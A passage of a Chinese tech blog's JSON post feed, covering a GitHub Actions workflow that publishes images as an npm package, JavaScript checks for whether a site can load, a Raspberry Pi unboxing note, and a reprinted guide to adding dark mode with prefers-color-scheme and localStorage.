<span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span 